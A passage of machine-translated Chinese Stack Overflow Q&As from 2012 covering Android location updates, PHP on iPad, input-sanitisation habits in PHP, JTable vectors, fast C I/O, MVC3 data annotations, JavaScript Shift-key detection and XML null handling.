4.  转到“大括号”选项卡。在列表的底部有一个“初始化器列表”的下拉菜单。从下拉列表中选择“同一行”，然后单击“确定”按钮关闭所有对话框。

注意：在同一窗口区域中，您将能够为类、函数、命名空间、if 语句、switch 语句等自定义大括号。

# android - Android Location Listener 经常调用

> ID：13093613
> 
> 赞同：4
> 
> 时间：2012-10-26T20:01:04.117
> 
> 标签：android, locationlistener

我正在使用网络位置提供商。我需要每 1 小时从我的*LocationListener调用**一次 onLocationChanged方法。*这是我的代码：

 *```
MyLocationListener locationListener = new MyLocationListener();   
locationMangaer.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 3600000, 0,locationListener); 
```

但它不起作用。我`onLocationChanged`经常打电话。

我必须使用哪些参数？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-10-26T20:14:23.897

从[`LocationManager#requestLocationUpdates()`](http://developer.android.com/reference/android/location/LocationManager.html#requestLocationUpdates%28long,%20float,%20android.location.Criteria,%20android.app.PendingIntent%29)文档中：

> 在 Jellybean 之前，minTime 参数只是一个提示，一些位置提供程序实现忽略了它。从 Jellybean 及以后，Android 兼容设备必须遵守 minTime 和 minDistance 参数。

但是，您可以使用`requestSingleUpdate()`Looper 和 Handler 每小时运行一次更新。

* * *

**此外**
，您可以在此处阅读有关[Loopers 和 Handlers 的](http://mindtherobot.com/blog/159/android-guts-intro-to-loopers-and-handlers/)更多信息。

您正在使用 API 8，这是一个不错的选择，但这限制了我们可以调用的 LocationManager 方法，因为大多数方法是在 API 9 中引入的。API 8 只有这三种方法：

```
requestLocationUpdates(String provider, long minTime, float minDistance, LocationListener listener)
requestLocationUpdates(String provider, long minTime, float minDistance, LocationListener listener, Looper looper)
requestLocationUpdates(String provider, long minTime, float minDistance, PendingIntent intent) 
```

让我们使用第一种方法，它是最简单的。

**首先，**像往常一样创建您的 LocationManager 和 LocationListener ，但`onLocationChanged()` *停止*请求更多更新：

```
@Override
public void onLocationChanged(Location location) {
    mLocationManager.removeUpdates(mLocationListener);
    // Use this one location however you please
} 
```

**其次，**创建几个新的类变量：

```
private Handler mHandler = new Handler();
private Runnable onRequestLocation = new Runnable() {
    @Override
    public void run() {
        // Ask for a location
        mLocationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, mLocationListener);
        // Run this again in an hour
        mHandler.postDelayed(onRequestLocation, DateUtils.HOUR_IN_MILLIS);
    }
}; 
```

当然，您应该禁用所有回调`onPause()`并再次启用它们，`onResume()`以防止 LocationManager 通过在后台获取未使用的更新而浪费资源。

* * *

**更技术性的一点：**
如果您担心使用 LocationManager 阻塞 UI 线程，那么您可以使用第二种`requestLocationUpdates()`方法从新线程（例如 HandlerThread）提供特定的 Looper。*

# php - 如何在 iPad 模拟器或设备上加载 PHP 网站？

> ID：13093622
> 
> 赞同：-1
> 
> 时间：2012-10-26T20:01:33.147
> 
> 标签：php, objective-c, xcode, ipad, apache

我有一个`.php`网站，我想把它放在 iPad 应用程序“网络应用程序”中。

我的意思是在 中创建`UIWebView`和加载文件`WebView`，所以我的第一个问题是，是否可以创建它`webApp`并且我可以在 Xcode 模拟器上运行它吗？

在 ipad 外部实现这个应用程序（Apache、MySQL）需要什么？

基本上我想让我的所有`.php`课程都在应用程序中并通过 iPad 应用程序运行，这意味着如果我没有任何互联网，我可以运行该应用程序。

因为我想在 iPad 和 XCode 模拟器中运行它。

你能给我一些实现这个应用程序的提示吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-29T13:29:35.880

您需要考虑的几点：

*   **App Store Approval** - 如果您打算推销此应用程序（即，它不适用于通过 Cydia 或内部公司应用程序的越狱设备），那么您很可能会遇到审批流程问题。*

    1.  您打算将脚本语言与您的应用程序捆绑在一起。现在这可能不是问题，具体取决于这是否暴露给最终用户；但你确实冒着被苹果发现并拔掉插头的风险。

    2.  以脚本语言（在您的情况下为 PHP）捆绑的替代方法是从外部服务器加载代码。这是一个禁忌，因为 Apple 要求您的应用程序具有离线功能 - 或者至少他们做到了。这留下了所有社交网络和其他依赖网络的应用程序......好吧，我想也有例外！

*   **设备性能**——您实际上是打算在移动设备上运行一个小型 Web 服务器；在这种情况下是平板电脑。这可能会占用大量资源，因此可能并不明智。我个人不希望我的电池被耗尽，因为有人决定他们想将 Web 服务器与他们的应用程序捆绑在一起。

在使用 UIWebView 方面，您的实现想法本身是合理的。您可能应该查看 Apache Cordova/PhoneGap 框架，它应该可以满足您的需求并提供一种现成的方式来打包您的 Web 应用程序。如果您确实需要自定义功能，那么无论如何都值得一看；插件相对容易开发，已经有很多可用的插件，现在cordova的计划是允许开发人员将其实现到本机应用程序中。（比如说，如果只有一个视图需要 PhoneGap 功能等）

就个人而言，我看不出什么需要 PHP 而不能通过 HTML5 和 PhoneGap 完成。有可用的存储选项、SQL 选项，您正在使用 Web 技术，因此可以轻松查询外部 Web 服务。它在应用程序批准方面也更加安全——因为它已经过试验和测试；*商店中已有许多使用此类解决方案构建的应用程序*。

我认为你需要认真重新考虑。否则，也许您可​​以发布更多详细信息？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T13:20:10.557

请注意，PHP 是一种服务器端语言。那么你想在你的 iPad 上运行一个服务器吗？如果是这样，您可以在适当的台式机/笔记本电脑上开发 PHP 应用程序，然后通过 Wifi 在 iPad Safari 浏览器上查看它们。

否则，您可以在越狱的 iOS 设备上安装带有 PHP库、[MySQL](http://modmyi.com/cydia/package.php?id=58410)、CURL 和所有来自[Cydia 应用商店的](https://cydia.saurik.com/)[LightHTTPd 服务器，](http://modmyi.com/cydia/package.php?id=22926)以获得完整的环境。对于 Android，有这个应用程序[PAW 服务器](http://paw-android.fun2code.de/)可用，它可以在此类设备中运行 Apache 服务器。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-10-30T08:40:50.027

如果您只想检查您的网站在小型设备上是否正常运行，或者您想检查您的网站的响应能力。转到：[Ipad Peek](http://ipadpeek.com/)并使用 url 在给定的设备/模拟器上运行您的网站。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-10-29T13:14:44.037

一个简单的谷歌搜索拉出了这个免费的框架：[http ://www.ipfaces.org/](http://www.ipfaces.org/)

我以前从未习惯过，但它可能会满足您的需求。

# php - 什么时候 PHP 代码真的应该被视为不安全的？

> ID：13093627
> 
> 赞同：11
> 
> 时间：2012-10-26T20:01:56.770
> 
> 标签：php, security

昨天我参加了 PHP 开发者职位的面试。我的工作是解决 15 个相当简单的测试题。问题之一是决定是否应该将类似于下面的代码视为不安全的。我给出了一个错误的答案（事实证明），并且在那次采访中另一个人的论点非常令人惊讶（至少对我来说）。

代码是这样的：

```
function someFunction($a)
{
    echo $a * 4;
}

someFunction($_GET['value']); 
```

可能的答案是：

*   总是，
*   仅当`register_globals`启用时，
*   绝不。

正确答案可以获得一分，对所选答案给出很好的解释（论证）可以获得第二分。

我的答案是第三个：*这段代码永远不会不安全*。加上论证：因为，**这只是一个简单的等式**。这里没有文件或数据库操作，没有流、协议，什么都没有。这只是一个等式。没有其他的。攻击者无法对 PHP 脚本做任何错误，无论他或她将尝试执行的格式错误的 URL 查询如何。没有机会。

我得了零分。我的回答都不正确，我的论点也不被接受。正确的答案是：*这段代码总是不安全的——你应该**总是**逃避，你从 URL 查询中得到了什么。*

我的问题是：这种观点真的很好吗？我们真的必须始终使用经验法则，即直接从查询中获取的任何内容都是不安全的，如果没有过滤、转义或以任何其他方式保护？这是否意味着，我教我的学生一种不安全的编码方法，因为在第一次 PHP 讲座中，他们编写了一个用于计算三角形区域的脚本，并且他们在任务中使用了来自 URL 的未转义、未过滤的参数？

我理解，安全性和编写安全代码应该是最高优先级的问题。但是，另一方面，这不是一点点*安全代码法西斯主义*（请原谅我，如果我冒犯了某人）来威胁任何不安全的代码，即使没有人能够对它造成任何伤害？

或者也许我完全错了，你**可以**对四次回声的功能造成一些伤害，你给它什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-26T20:08:24.950

问题是稍后有人可能会更改函数“somefunction”并且做的不仅仅是将它乘以 4。

该函数本身并不是不安全的，而是以下行：

```
 someFunction($_GET['value']); 
```

是完全不安全的。也许`someFunction`会被重构到另一个文件中，或者在代码中。您应该始终检查并清理用户提供的数据，以保护您自己和其他在某个库或函数上工作的人，而不是期望您将纯 $_GET 数组数据传递给他们。

在与他人合作时尤其如此，这也是为什么在采访中被问到的原因——看看您是否展望未来的潜在问题，而不是看到您了解当前`someFunction`在传递可能危险的 GET 数据时是无害的。当您的同事重构 someFunction 以查询数据库表时，这成为一个问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T20:09:18.717

没有花太多时间玩您的代码示例，我不会说它可以用来“造成伤害”，但是，除非传递某种形式的数字，否则您的函数将无法正常工作。从长远来看，最好是转义你的代码，处理错误的数据，然后等待不知情的用户将错误类型的值放入你的盒子并破坏事物的那一天。我敢肯定，你面试的公司只是在寻找一个有良好习惯的人，以确保他们的代码完整且牢不可破。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-29T01:57:52.990

**永远不要**相信来自用户的任何东西。只是不要。即使您无法理解您的代码/类/包被滥用的可能性，也要通过确保对您的产品的输入*完全*符合您的期望来掩饰自己的屁股，这并不奇怪。至少，有人可能会向该方法提供错误的输入，只是为了搞砸您的应用程序，导致它显示错误或出现白屏死机。进行基本乘法的代码是这种恶意的主要候选者。它不仅适用于 PHP，也适用于一般的编程/设计。

# android - 在请求中将对象数组作为 url 参数传递

> ID：13093628
> 
> 赞同：2
> 
> 时间：2012-10-26T20:01:58.673
> 
> 标签：android, http, httprequest

我需要在 http 请求的 url 中放置一个对象数组（每个对象有 2 个字段）作为参数。我该怎么做？这个链接应该是什么样子？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T20:25:12.260

您可以使用您的结构创建一个 xml，即一个对象数组，每个对象有两个字段，然后将其转换为字符串，例如，

```
 String  input = String.format("<Request><Data><Id>%s</Id></Data> 
       </Request>",studentIdSelected); 
```

然后使用 input 和 url 作为参数调用此方法以发布您的数据，

```
 public static String retriver(String Url, String input) {

    String responseString = null;
    StringEntity stringEntity;
    HttpPost postRequest = new HttpPost(Url);
    try {

        Log.e("string is", input + "\n" + Url);
        stringEntity = new StringEntity(input, "UTF-8");
        stringEntity.setContentType("application/atom+xml");

        postRequest.setEntity(stringEntity);
        Log.v("Post", "Posted");
        HttpClient httpclient = new DefaultHttpClient();
        HttpResponse response = httpclient.execute(postRequest);  
        HttpEntity getResponseEntity = response.getEntity();

        responseString = EntityUtils.toString(getResponseEntity);

    } catch (Exception e) {
        // TODO: handle exception
        postRequest.abort();
        Log.w("HttpPostRetreiver", "Error for URL " + Url, e);
    }

    return responseString;

} 
```

或者，您也可以使用 json。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T20:21:44.350

最好的解决方案是以 json 或 xml 格式发送 http post 请求。

# php - 在服务器端（PHP）或客户端（Javascript）检测移动浏览器是否更好/更快？

> ID：13093629
> 
> 赞同：0
> 
> 时间：2012-10-26T20:02:01.860
> 
> 标签：php, javascript, jquery, mobile, jquery-mobile

我已经看到检测某人是否在 Javascript 中使用移动浏览器的代码（例如 jQuery 脚本），并且我看到了一些在 PHP（或其他服务器端语言）中工作的代码。但我从未见过一个很好的解释来说明在所有或任何情况下一个是否比另一个更好。有没有理由为什么一个是更好的选择？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-26T20:06:54.970

典型的答案：这取决于您为什么要进行检查...

从我的角度来看，这是我通常认为的：

*   如果您想基于浏览器向用户呈现不同的体验（手机、平板电脑、笔记本电脑等），请在服务器上进行。

*   如果您想呈现相同的一般体验，但需要考虑浏览器兼容性问题，请在客户端进行。

UX领域的一些人也认为向用户呈现一个空白页面并动态填充它是“糟糕的形式”。相反，应填充初始页面，并且可以动态添加或更改内容。如果您对此感到担忧，则可能需要结合使用服务器端和客户端。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T20:04:55.227

我想说更好的方法是在服务器端，因为对于 Javascript，你需要等到页面被渲染，而在服务器端它发生在之前。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-26T20:07:25.307

如果您尝试检测这一点以决定哪些 javascript 功能可用，您将获得更高的准确性，如果您在 JavaScript 中执行此操作，则不会对速度造成任何重大损失。

如果您要完全更改呈现的页面类型，例如完整网站或移动网站，则最好在服务器端进行。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-04-13T06:32:28.160

作为一名 Web 开发人员、UX 和 UI 程序员，我认为如果有人想更改他们的 UA，那很好。他们要处理不兼容的问题。至于移动设备与桌面设备，我建议使用轻量版的 browscap.ini，而不是搜索设备检查来查找 ismobiledevice。if 语句将是真或假，那么您也可以检查平板电脑。在 if mobile 子句中检查关联数组中的 istablet 键。您可以将它用于手机或平板电脑的 CSS。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-26T20:05:00.760

绿色比红色好吗？

一切都有其优点和缺点。例如，在服务器端做更可靠，在客户端做意味着更少的服务器工作。

事实上，**客户端可能禁用了 JavaScript**（请参阅 Firefox 的 NoScript 扩展和 Chrome 的 ScriptNo，它允许聪明的用户仅在您真正*需要*它的站点上启用 JS - 一个很好的副作用是它还消除了几乎所有这些天来的广告，因为它们现在似乎很大程度上依赖于来自第三方域的 JS）。因此，仅使用 User-Agent 字符串更*可靠*，但*灵活性*较差。

如果您使用 JS-heavy，您可能会使用*笨拙的服务器*，即您不需要慢速 PHP，但您可以通过各种 CDN 等通过高性能静态服务来提供所有数据 - 但任何需要 JS 的东西搜索蜘蛛的效果会*不太*好，一些用户可能会*阻止*它。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-10-26T20:06:41.080

正如 Ricebowl 所说，永远不要相信客户。但是，我觉得如果您确实信任客户，这几乎总是一个问题。如果您的应用程序值得编写，则值得妥善保护。如果有人可以通过编写自己的客户端并传递您不期望的数据来破坏它，那是一件坏事。因此，您需要在服务器上进行验证。

# java - Java 的 Vector 和 JTable 的问题

> ID：13093631
> 
> 赞同：2
> 
> 时间：2012-10-26T20:02:08.703
> 
> 标签：java, vector, jtable, classcastexception

我第一次在 Java 中修改 JTables 和 Vectors，并且遇到了一个有趣的问题。我的代码编译正确，但是当我运行它时，出现以下异常：

> 线程“主”java.lang.ClassCastException 中的异常：java.lang.String 无法转换为 java.util.Vector

我没有看到我正在投射的任何地方，所以我有点困惑。

```
Vector<String> columnNames = new Vector<String>();
columnNames.add("Tasks");

Vector<String> testing = new Vector<String>();
testing.add("one");
testing.add("two");
testing.add("three");

table = new JTable(testing, columnNames); // Line where the error occurrs.
scrollingArea = new JScrollPane(table); 
```

我的目标是有一个 JPanel 表，但是当我尝试使用 <taskPanel> 的 Vector 时出现相同类型的错误这是扩展 JPanel 的类：

```
class taskPanel extends JPanel
{
    JLabel repeat, command, timeout, useGD;

    public taskPanel()
    {
        repeat = new JLabel("Repeat:");
        command = new JLabel("Command:");
        timeout = new JLabel("Timeout:");
        useGD = new JLabel("Update Google Docs:");

        add(repeat);
        add(command);
        add(timeout);
        add(useGD);
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-26T20:10:06.407

您的`testing`向量应该是`vector of vectors`因为每一行都应该包含所有列的数据，例如

```
 Vector<Vector> testing = new Vector<Vector>();
    Vector<String> rowOne = new Vector<String>();
    rowOne.add("one");
    Vector<String> rowTwo = new Vector<String>();
    rowTwo.add("two");
    Vector<String> rowThree = new Vector<String>();
    rowThree.add("three");

    testing.add(rowOne);
    testing.add(rowTwo);
    testing.add(rowThree);

    table = new JTable(testing, columnNames); // should work now
    scrollingArea = new JScrollPane(table); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-26T20:10:20.533

你需要在这里使用`Vector`一个`Vectors`：

```
Vector<Vector> rowData = new Vector<Vector>();
rowData.addElement(testing);

JTable table = new JTable(rowData, columnNames); 
```

对于多`Vector`列表模型，请参阅此[示例](http://www.java2s.com/Tutorial/Java/0240__Swing/publicJTableVectorrowDataVectorcolumnNames.htm)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-26T20:06:50.953

强制转换是 <String>。你现在不能有向量字符串。看看[这个](https://stackoverflow.com/questions/1111745/how-to-create-an-array-of-string-vectors-)。

# c - 如何处理c中的大输入

> ID：13093633
> 
> 赞同：0
> 
> 时间：2012-10-26T20:02:18.737
> 
> 标签：c

我在一个网站上解决了一个练习题，上面写着

> 此问题的目的是验证您用于读取输入数据的方法是否足够快以处理带有大量输入/输出警告的问题。您应该能够在运行时每秒处理至少 2.5MB 的输入数据。

另外，我如何优化 printf 和 scanf 以外的输入/输出例程？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T20:07:36.837

它是特定于操作系统的（因为 C 标准只知道`<stdio.h>`）。对于 Linux，考虑使用低级系统调用来提高效率，例如[open(2)](http://www.kernel.org/doc/man-pages/online/pages/man2/open.2.html)、[mmap(2)](http://www.kernel.org/doc/man-pages/online/pages/man2/mmap.2.html)、[read(2)](http://www.kernel.org/doc/man-pages/online/pages/man2/read.2.html)、[pread(2)](http://www.kernel.org/doc/man-pages/online/pages/man2/pread.2.html)、[write(2)](http://www.kernel.org/doc/man-pages/online/pages/man2/write.2.html)。您可能还想使用[readahead(2)](http://www.kernel.org/doc/man-pages/online/pages/man2/readahead.2.html)。不要忘记在相当大的块（例如 128Kbytes）中进行 I/O，如果可能，页面对齐。阅读《[高级 Linux 编程](http://advancedlinuxprogramming.com)》一书。

如果仅限于标准 C99 函数，请在相当大的块上使用[fread(3) 。](http://www.kernel.org/doc/man-pages/online/pages/man3/fread.3.html)[还可以考虑使用setvbuf(3)](http://www.kernel.org/doc/man-pages/online/pages/man3/setvbuf.3.html)增加内部缓冲区

而 2.5Mbyte/sec 也不是很令人印象深刻。可能瓶颈是硬件，但您应该能够在标准桌面硬件上获得 20 或 50Mbytes/sec。使用 SSD 会有很大帮助。

# c# - mvc3 从接口反映具体类的数据注释

> ID：13093634
> 
> 赞同：3
> 
> 时间：2012-10-26T20:02:19.140
> 
> 标签：c#, asp.net-mvc-3, data-annotations, unboxing, asp.net-mvc-views

我试图从各种类型的视图中抽象出我的视图模型。整个编译过程没有问题，但我在“反映”（正式称为拆箱）数据注释方面遇到问题。

我有一个界面：

```
public interface IPerson
{
    string FirstName { get;set;}
    string LastName {get;set;}
} 
```

我有两个类实现了这样的接口：

```
public class Employee : IPerson
{
    [Required]
    [Display(Description = "Employee First Name", Name = "Employee First Name")]
    public string FirstName {get;set;}

    [Required]
    [Display(Description = "Employee Last Name", Name = "Employee Last Name")]
    public string LastName {get;set;}

    public int NumberOfYearsWithCompany {get;set;}
}

public class Client : IPerson
{
    [Required]
    [Display(Description = "Your first Name", Name = "Your first Name")]
    public string FirstName {get;set;}

    [Display(Description = "Your last Name", Name = "Your last Name")]
    public string LastName {get;set;}

    [Display(Description = "Company Name", Name = "What company do you work for?")]
    public string CompanyName {get;set;}
} 
```

人员编辑视图：视图/人员/编辑如下：

```
@model IPerson

<div class="clear paddingbottomxxsm">
    <div class="editor-label">
        @Html.LabelFor(model => model.FirstName)
    </div>
    <div class="editor-field">
        @Html.EditorFor(model => model.FirstName)
        @Html.ValidationMessageFor(model => model.FirstName)
    </div>
</div>
<div class="clear paddingbottomxxsm">
    <div class="editor-label">
        @Html.LabelFor(model => model.LastName)
    </div>
    <div class="editor-field">
        @Html.TextBoxFor(model => model.LastName)
        @Html.ValidationMessageFor(model => model.LastName)
    </div>
</div> 
```

员工编辑视图：视图/员工/编辑：

```
@model Employee

Html.RenderAction("Edit", "Person", new { person = Model });

<div class="clear paddingbottomxxsm">
    <div class="editor-label">
        @Html.LabelFor(model => model.CompanyName)
    </div>
    <div class="editor-field">
        @Html.TextBoxFor(model => model.CompanyName)
        @Html.ValidationMessageFor(model => model.CompanyName)
    </div>
</div> 
```

PersonController 在哪里：

```
public ActionResult Edit(IPerson person)
{
    return PartialView(person);
} 
```

**一切都编译并渲染得很好**。但是，*数据注释*正在丢失。

因此，Employee/Edit 的结果如下：

> 名字 [文本字段]
> 
> 姓氏 [文本字段]
> 
> 你在什么公司工作？[textfield] 公司名称是必填字段

有没有为具体类拆箱这些数据注释？

**边注**

我尝试将 IPerson 显式转换为 Employee：

```
@model IPerson
@{
    var employee = (Employee)Model;
}
<div class="clear paddingbottomxxsm">
    <div class="editor-label">
        @Html.LabelFor(model => employee.FirstName)
    </div>
    <div class="editor-field">
        @Html.EditorFor(model => employee.FirstName)
        @Html.ValidationMessageFor(model => employee.FirstName)
    </div>
</div>
<div class="clear paddingbottomxxsm">
    <div class="editor-label">
        @Html.LabelFor(model => employee.LastName)
    </div>
    <div class="editor-field">
        @Html.TextBoxFor(model => employee.LastName)
        @Html.ValidationMessageFor(model => employee.LastName)
    </div>
</div> 
```

这样做需要名字，但没有从标签中获取显示属性。

**更新** 经过多次讨论这是否是拆箱，我还没有找到从（更基本的）具体类中获取数据注释的简单解决方案。使用视图（或助手）中的反射来获取具体类的数据注释确实会破坏简单性的目标。

我们有几个视图基本相同，但必填字段和显示名称略有不同。如果我可以将视图模型传递给接口视图并且它会找出所需的字段并显示属性，那将非常方便。如果有人想出办法做到这一点，将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2015-10-15T12:57:17.603

我遇到了同样的问题，`TextBoxFor`助手没有生成正确的标记验证。

我能够解决它的方法是使用`TextBox`助手而不是`TextBoxFor`助手。

这是对我有用的部分片段

```
 @model Interfaces.Models.EntryPage.ICustomerRegisterVM

    <p>
        @Html.ValidationMessageFor(model => model.Department)
        @Html.TextBox(Html.NameFor(model => model.Department).ToString(), Model.Department)
    </p> 
```

如您所见，我使用`Html.NameFor`助手从表达式中生成正确的名称，然后传入属性。使用这种方法，MVC 能够成功地为实现被称为视图模型的接口的具体类生成正确的不显眼的验证标记。

我没有为`LabelFor`其他助手尝试过这种方法。但我希望结果是一样的。

请注意`Html.NameFor`帮助器在 MVC5 中可用

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T21:25:19.170

您在调用操作时指定了一个`IPerson`没有数据属性的模型 ( ) `PersonController.Edit`。默认元数据提供程序将仅获取在指定类型（在本例中为`IPerson`）上显式定义的数据属性或继承的数据属性。您可以共享元数据类或接口或将数据注释属性复制到接口。

但是，我认为您可能需要重新设计它的工作方式（例如，调用`RenderAction`以将另一个视图包含到当前视图中是代码异味）。

我会为 Person 创建一个局部视图。然后，您可以为每种类型的人（客户等）创建一个局部视图。然后，您可以添加任何其他标记，并`Person`使用`@Html.Partial("Person", Model)`.

您可能还想使用基类`Person`而不是接口，否则覆盖`FirstName`and的数据属性会很棘手`LastName`。

```
public abstract class Person
{
    public virtual string FirstName {get;set;}

    public virtual string LastName {get;set;}
}

public class Employee : Person
{
    [Required]
    [Display(Description = "Employee First Name", Name = "Employee First Name")]
    public override string FirstName {get;set;}

    [Required]
    [Display(Description = "Employee Last Name", Name = "Employee Last Name")]
    public override string LastName {get;set;}

    public int NumberOfYearsWithCompany {get;set;}
}

public class Client : Person
{
    [Required]
    [Display(Description = "Your first Name", Name = "Your first Name")]
    public override string FirstName {get;set;}

    [Display(Description = "Your last Name", Name = "Your last Name")]
    public override string LastName {get;set;}

    [Display(Description = "Company Name", Name = "What company do you work for?")]
    public string CompanyName {get;set;}
} 
```

视图/共享/Person.cshtml

```
@model Person

<div class="clear paddingbottomxxsm">
    <div class="editor-label">
        @Html.LabelFor(model => model.FirstName)
    </div>
    <div class="editor-field">
        @Html.EditorFor(model => model.FirstName)
        @Html.ValidationMessageFor(model => model.FirstName)
    </div>
</div>
<div class="clear paddingbottomxxsm">
    <div class="editor-label">
        @Html.LabelFor(model => model.LastName)
    </div>
    <div class="editor-field">
        @Html.TextBoxFor(model => model.LastName)
        @Html.ValidationMessageFor(model => model.LastName)
    </div>
</div> 
```

视图/员工/Edit.cshtml

```
@model Employee

@Html.Partial("Person", Model);

<div class="clear paddingbottomxxsm">
    <div class="editor-label">
        @Html.LabelFor(model => model.CompanyName)
    </div>
    <div class="editor-field">
        @Html.TextBoxFor(model => model.CompanyName)
        @Html.ValidationMessageFor(model => model.CompanyName)
    </div>
</div> 
```

控制器/EmployeesController.cs

```
public class EmployeesController : Controller
{
    public ActionResult Edit(int id)
    {
         var model = GetEmployee(id); // replace with your actual data access logic

         return View(model);
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-11-02T09:21:56.517

我发现这篇文章在同样的问题上苦苦挣扎。

（附带说明：我已经按照这个示例实现了我自己的 DataAnnotationsModelMetadataProvider 以便能够访问我的编辑器模板中的自定义属性： [http ://weblogs.asp.net/seanmcalinden/archive/2010/06/11/custom- asp-net-mvc-2-modelmetadataprovider-for-using-custom-view-model-attributes.aspx](http://weblogs.asp.net/seanmcalinden/archive/2010/06/11/custom-asp-net-mvc-2-modelmetadataprovider-for-using-custom-view-model-attributes.aspx)。如果您想使用自己的 DataAnnotationsModelMetadataProvider 解决此问题，请确保不要错过应用程序启动中的步骤）

因此，在几乎放弃让它工作之后，我决定调试我的 CreateMetadata 覆盖，看看我能在那里得到什么。我还发现了这个帖子：

[从 ASP.NET MVC 中的 ModelMetadataProvider 获取包含对象实例](https://stackoverflow.com/questions/5241012/obtain-containing-object-instance-from-modelmetadataprovider-in-asp-net-mvc)

这与 DataAnnotationsModelMetadataProvider 类的一些反映相结合，使我得到以下解决方案：

```
public class MyModelMetadataProvider : DataAnnotationsModelMetadataProvider
{
    protected override ModelMetadata CreateMetadata(
        IEnumerable<Attribute> attributes,
        Type containerType,
        Func<object> modelAccessor,
        Type modelType,
        string propertyName)
    {
        //If containerType is an interface, get the actual type and the attributes of the current property on that type.
        if (containerType != null && containerType.IsInterface)
        {
            object target = modelAccessor.Target;
            object container = target.GetType().GetField("container").GetValue(target);
            containerType = container.GetType();
            var propertyDescriptor = this.GetTypeDescriptor(containerType).GetProperties()[propertyName];
            attributes = this.FilterAttributes(containerType, propertyDescriptor, Enumerable.Cast<Attribute>((IEnumerable)propertyDescriptor.Attributes));
        }

        var modelMetadata = base.CreateMetadata(attributes, containerType, modelAccessor, modelType, propertyName);

        //This single line is for the "sidenote" in my text above, remove if you don't use this:
        attributes.OfType<MetadataAttribute>().ToList().ForEach(x => x.Process(modelMetadata));

        return modelMetadata;
    }
} 
```

因此，现在我可以拥有一个具有接口类型作为模型的 EditorTemplate，然后使用它的不同实现，以便能够通过数据注释具有不同的字段名称和验证规则。我将其用于需要三个不同地址的表单；家庭住址、工作地址和发票地址。这些输入组的用户界面完全相同，但验证规则不同。

这当然是一种基于约定的解决方案，即当编辑器模板模型是接口时，这种行为应该始终适用。如果您有现有的编辑器模板，其中模型是其自身具有数据注释的接口类型，那么此解决方案当然会打破这一点。就我而言，我们刚刚开始使用 MVC，现在这个约定将起作用。将接口中的属性和实际类型的组合发送到基本实现会很有趣，但我将把这个实验留到以后。

如果您是一位知道此解决方案存在严重缺陷的读者，也请告诉我。

# javascript - 检测是否按下 Shift

> ID：13093635
> 
> 赞同：3
> 
> 时间：2012-10-26T20:02:22.610
> 
> 标签：javascript

我有一个电话领域的情况。在此字段中，用户可以键入以下电话号码：

(00)9999 9999
(00)99999 9999（巴西圣保罗）
和 1234*12（Nextel 号码）

在外业电话上，我配置了一个调用此 javascript 函数的 onkeydown 事件：

```
function validateKeyDownPhone(event) {

    var c = event.keyCode
        keychar=String.fromCharCode(c)
        valid = true

    /**
     * Excluding enter, backspace, etc. 
     */
    if (c > 46 ) {          
        if (keychar != null) {  
            var re = new RegExp("^[0-9\*#\(\) ]+$")
            matched = keychar.match(re)
            valid = matched != null && matched.length > 0
        }
    }
    event.returnValue = valid
} 
```

它工作正常，但是当我按 SHIFT + 5 时，例如，结果为 %。

如何识别是否按下了 shift 键？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T20:06:48.350

该[`event.shiftKey`](https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/shiftKey)属性应该告诉您该信息。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T20:13:19.093

听`keypress`而不是`keydown`事件。然后您可以根据实际键入的字符而不是按下的键来拒绝。因此，您不必猜测用户的键盘布局。例如，Mac 上的 option+5 不会输入 5，但如果您只查看 shift 键的状态，您会错过它。

# javascript - 如果数据为空，则不显示

> ID：13093638
> 
> 赞同：-2
> 
> 时间：2012-10-26T20:02:40.633
> 
> 标签：javascript, xml

这是我的代码。我从 xml 获取数据。我想要的是：如果一条数据为空，则不要显示该行。我该怎么做？

```
 downloadUrl("xml/cat.xml", function(doc) {
     var xml = xmlParse(doc);
     var markers = xml.documentElement.getElementsByTagName("marker");   

     for (var i = 0; i < markers.length; i++) {
         // obtain the attribues of each marker
         var lat = parseFloat(markers[i].getAttribute("lat"));
         var lng = parseFloat(markers[i].getAttribute("lng"));
         var point = new google.maps.LatLng(lat,lng);
         var kWa = markers[i].getAttribute("kWa");     

         var html = 'rows here  '; 
```

抱歉问错问题了。。

我想躲在这里

```
var html = '

id='+id+', kwa='+kwa+' // if id is null how can hide item in here..?  

'; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T20:11:06.783

您可以通过以下`if`检查来做到这一点：

```
 if(markers[i].getAttribute("lat") != NULL) // or "NULL" as a string if thats what is returned."
     var lat = parseFloat(markers[i].getAttribute("lat)); 
```

或者你可以把它放在一个`try - catch`声明中：

```
for (//codes){
    try{ 
        //try parsing here
    }catch(e){
        if(e) // do something with the error
} 
```

这样做的好处是可以让您为每条错误消息做一些事情。但缺点是速度慢。（虽然不像以前在 javascript 中那么慢）

# sql - 选择A列相同但B列不同的行

> ID：13093642
> 
